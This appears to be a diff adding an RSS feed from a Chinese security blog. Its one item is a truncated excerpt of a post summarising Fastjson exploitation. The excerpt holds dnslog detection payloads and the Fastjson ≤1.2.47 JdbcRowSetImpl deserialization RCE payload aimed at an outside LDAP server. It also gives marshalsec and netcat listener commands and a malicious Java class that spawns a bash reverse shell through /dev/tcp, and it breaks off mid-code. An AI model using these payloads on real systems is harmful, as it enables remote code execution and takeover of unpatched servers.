@@ -1,0 +1,23 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>web - 分类 - 柠檬k</title>
+        <link>https://songzhiv.github.io/categories/web/</link>
+        <description>web - 分类 - 柠檬k</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>songzhiv@126.com (nmk)</managingEditor>
+            <webMaster>songzhiv@126.com (nmk)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 01 Feb 2022 23:11:59 &#43;0800</lastBuildDate><atom:link href="https://songzhiv.github.io/categories/web/" rel="self" type="application/rss+xml" /><item>
+    <title>Fastjson利用总结</title>
+    <link>https://songzhiv.github.io/fastjson/</link>
+    <pubDate>Tue, 01 Feb 2022 23:11:59 &#43;0800</pubDate>
+    <author>作者</author>
+    <guid>https://songzhiv.github.io/fastjson/</guid>
+    <description><![CDATA[0X01 漏洞利用 探测fastjson 对于有错误回显的情况
+使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
+无回显使用dnslog探测POC：
+ {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}} {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;} Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}] Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;} {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0  抓包修改请求体
+==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
+验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，
+无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
+{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
+ 在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e.]]></description>
+</item></channel>
+</rss>
